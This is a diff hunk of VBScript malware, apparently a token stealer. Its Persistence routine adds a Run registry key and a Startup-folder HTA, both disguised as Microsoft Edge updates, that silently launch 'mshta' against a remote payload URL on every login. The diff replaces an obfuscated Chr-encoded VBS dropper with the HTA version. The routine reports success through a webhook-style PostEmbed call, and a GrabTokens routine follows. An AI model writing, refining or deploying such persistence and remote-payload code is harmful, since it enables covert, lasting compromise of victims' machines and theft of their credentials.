@@ -159,14 +159,21 @@ Sub Persistence()
     Dim payload : payload = "mshta https://dicerigx.app/"
     On Error Resume Next
     
+    ' Registry key to run the HTA on startup
     sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\EdgeUpdate", payload, "REG_SZ"
     
-    Dim sp : sp = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\msedge_update.vbs"
+    ' Drop an HTA file directly into the Startup folder
+    Dim sp : sp = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\msedge_update.hta"
     Dim sf : Set sf = fso.CreateTextFile(sp, True)
-    sf.WriteLine "CreateObject(Chr(87)&Chr(83)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(46)&Chr(83)&Chr(104)&Chr(101)&Chr(108)&Chr(108)).Run Chr(34)&""" & payload & """&Chr(34), 0, False"
+    
+    ' The HTA file just redirects to your main payload URL
+    sf.WriteLine "<html><head><script language=""VBScript"">"
+    sf.WriteLine "CreateObject(""WScript.Shell"").Run """ & payload & """, 0, False"
+    sf.WriteLine "window.close()"
+    sf.WriteLine "</script></head><body></body></html>"
     sf.Close
     
-    Call PostEmbed(":pushpin: Persistence", "EdgeUpdate Registry and Startup VBS installed", 10181046)
+    Call PostEmbed(":pushpin: Persistence", "EdgeUpdate Registry and Startup HTA installed", 10181046)
 End Sub
 
 Sub GrabTokens(targetWH)
